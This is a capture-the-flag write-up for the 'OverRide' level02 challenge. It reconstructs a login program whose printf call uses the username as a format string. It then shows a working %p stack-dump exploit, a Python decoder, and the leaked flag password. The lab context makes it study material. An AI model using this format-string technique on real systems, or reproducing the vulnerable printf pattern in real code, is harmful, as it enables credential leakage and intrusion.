# level02

## Reconstructed C source code from assembly

```c
#include <stdio.h>

int main()
{
  char password[100];
  char pass_buffer[42];
  char username[100];
  int nread;
  FILE *stream;

  memset(username, 0, sizeof(username));
  memset(pass_buffer, 0, 41);
  memset(password, 0, sizeof(password));
  stream = 0LL;
  nread = 0;
  stream = fopen("/home/users/level03/.pass", "r");
  if (!stream)
  {
    fwrite("ERROR: failed to open password file\n", 1, 36, stderr);
    exit(1);
  }
  nread = fread(pass_buffer, 1, 41, stream);
  pass_buffer[strcspn(pass_buffer, "\n")] = 0;
  if (nread != 41)
  {
    fwrite("ERROR: failed to read password file\n", 1, 36, stderr);
    exit(1);
  }
  fclose(stream);
  puts("===== [ Secure Access System v1.0 ] =====");
  puts("/***************************************\\");
  puts("| You must login to access this system. |");
  puts("\\**************************************/");
  printf("--[ Username: ");
  fgets(username, 100, stdin);
  username[strcspn(username, "\n")] = 0;
  printf("--[ Password: ");
  fgets(password, 100, stdin);
  password[strcspn(password, "\n")] = 0;
  puts("*****************************************");
  if (strncmp(pass_buffer, password, 41))
  {
    printf(username);
    puts(" does not have access!");
    exit(1);
  }
  printf("Greetings, %s!\n", username);
  system("/bin/sh");
  return 0;
}
```

## Cracking it

Inspecting the source code, it is clear that there is a **format string vulnerability**. The variable `username` is directly used as a format string. We can dump the stack content with multiple `%p`, then making it easy to have access to the password that is read and stored on the stack. Our input will have a very easy recognizable pattern in the stack dump, so we can pin point where the password could be stored.

```bash
level02@OverRide:~$ (python -c 'print("%p"*49)'; sleep 0.1; echo "ABCDEFGH") | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4e0(nil)0x410x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6d80x1f7ff9a080x4847464544434241(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x29000070250x602010(nil)0x7ffff7a3d7ed(nil)0x7fffffffe6d80x1000000000x400814(nil)0x599f0374e117fac3 does not have access!
```

The dump `(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)` is probably our target, since it contains only valid ASCII values. With the help of a python script, we can make make this dump human readable by reordering the byte in a correct order (stack value are read in little-endian format by `printf`), and convert each byte to it's ASCII equivalent.

```python
s = "756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394d"

def get_readable_stack_dump(stack_dump: str):
    group_16 = [s[i:i+16] for i in range(0, len(s), 16)]
    final_list = []
    for group in group_16:
        pair = [group[i:i+2] for i in range(0, len(group), 2)]
        final_list += pair[::-1]
    return final_list

if __name__ == "__main__":
    ascii_pass = ''.join([chr(int(h, 16)) for h in get_readable_stack_dump(s)])
    print(ascii_pass)
```

Launching this script, we end up with the following flag : `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`.